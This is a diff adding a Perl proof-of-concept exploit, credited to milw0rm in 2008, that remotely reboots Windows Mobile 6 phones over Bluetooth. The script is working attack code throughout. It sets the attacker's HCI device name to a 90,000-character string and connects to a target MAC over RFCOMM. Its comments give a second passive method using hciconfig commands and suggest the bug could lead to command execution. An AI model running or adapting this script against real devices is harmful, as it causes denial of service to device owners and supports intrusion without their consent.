@@ -1,0 +1,44 @@
+#!/usr/bin/perl
+#
+# ----------WM6 remote overflow reboot PoC----------
+# Simple exploit for remote rebooting a windows mobile device
+# Maybe we can use it for doing command execution,
+# I've not test it since the device is rebooting and do not dump a core
+# for further analysing.
+#
+# The bug is not realy in the long string name but when it's the first
+# time the wm6 device try to get a connection with too long name. 
+#
+# There's two way to exploit this bug, this PoC show the first method 
+# (direct connect to the device if we know the bdaddr) but you can
+# just wait for the device to search and overflow by itself when
+# seeing the hci name:
+# hciconfig <hci dev> name `perl -e 'print "A"x90000'`
+# hciconfig <hci dev> piscan
+# You just have to wait until the wm device search for bluetooth devices
+# in range and it will be overflowed
+#
+#  *Tested on WM6 fully patched  on [HTC wiza 200],[HTC Mda 8125]
+# (by Julien Bedard)
+#
+
+use Net::Bluetooth;
+
+$target=$ARGV[0];
+$hci_dev=$ARGV[1];
+$overflow="A" x 90000;
+$rfcomm_port="3";
+
+if (@ARGV < 2)
+{
+die "Usage:\n       ./wm6_dos.pl <target_mac> <hci_device>\n\n";
+}
+
+# change this lame cmd ???
+system("hciconfig $hci_dev name $overflow");
+
+$over_conn = Net::Bluetooth->newsocket("RFCOMM");
+print "socket error $!\n" unless(defined($over_conn));
+$over_conn->connect($target, $rfcomm_port);
+
+# milw0rm.com [2008-09-26]
